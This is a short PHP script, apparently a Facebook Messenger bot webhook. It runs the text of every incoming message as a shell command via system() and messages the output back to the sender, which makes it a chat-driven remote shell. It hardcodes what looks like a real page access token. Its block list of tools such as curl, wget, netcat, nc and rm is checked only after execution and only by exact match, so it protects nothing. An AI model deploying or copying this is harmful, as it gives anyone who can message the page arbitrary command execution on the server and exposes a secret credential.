<?php
function crot($path,$token,$data = NULL){
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $path.$token);
			if($data != NULL){
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
			}
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$headers = array();
			$headers[] = "Content-Type: application/json";
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			$res = curl_exec($ch);
			curl_close($ch);
			return $res;
		}

file_put_contents("get.txt",file_get_contents("php://input"));
$fb = file_get_contents("get.txt");
$fb = json_decode($fb);
$rid = $fb->entry[0]->messaging[0]->sender->id;
$get = $fb->entry[0]->messaging[0]->message->text;
$token = "EAACEBZBQTYrYBAJZBnLAbdHQXq5bRWZBzjrZCZCWCdcHCGAEcykxf6ztZCrkrVZBLkgbDVd6fMi3hspyNFomUxUJqW94J35Q0DohZBPZAUgSujSXf7hlmTZBizJdgSbtEWsVrl9t8MTyYzoyGSaJnv1cYRLV6iOKhYqqhido3PzMFfOAx7J19NREJv";
$system = system($get);	



$filter = ["shutdown","curl","wget","rm","halt","mkdir","netcat","nc","ping","ssh","ftp","telnet","kill","reboot"];
if (in_array($get,$filter)){
$data = array(
	'recipient'=>array('id'=>$rid),
	'message'=> array('text'=>"Ngapain cok??")
	);
}else{
    $data = array(
	'recipient'=>array('id'=>$rid),
	'message'=> array('text'=>$system)
	);
}
crot('https://graph.facebook.com/v2.6/me/messages?access_token=',$token,$data);
